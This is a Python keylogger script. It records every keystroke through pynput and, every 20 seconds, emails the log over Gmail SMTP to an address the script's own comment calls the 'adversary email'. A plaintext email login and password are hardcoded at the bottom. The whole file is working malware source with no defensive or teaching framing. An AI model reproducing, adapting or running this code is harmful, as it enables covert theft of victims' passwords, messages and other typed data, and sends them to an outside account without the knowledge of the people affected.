#!/usr/bin/env python
import pynput.keyboard
import threading
import smtplib

class Keylogger:
    def __init__(self, time_interval, email, password):
        self.log = "keylogger started"
        self.interval=time_interval
        self.email= email
        self.password = password
    def  append_to_log(self, string):
        self.log= self.log + string
    def pro_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key= " "
            else:
                current_key = " "+str(key) +" "
        self.append_to_log(current_key)
    def report(self):
        self.send_mail(self.email, self.password, "\n\n"+ self.log)
        self.log =""
        timer=threading.Timer(self.interval, self.report)
        timer.start()
    def send_mail(self, email, password, message):
        # send mail to mail using smtp
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        # from, to ,msg
        server.sendmail(email, email, message)
        server.quit()
    def start(self):
        key_listen = pynput.keyboard.Listener(on_press=self.pro_key_press)
        with key_listen:
            self.report()
            key_listen.join()

my_key = Keylogger(20, "root.kali2000@gmail.com", "unhuman0174")
# seconds interval,adversary email,mail password
my_key.start()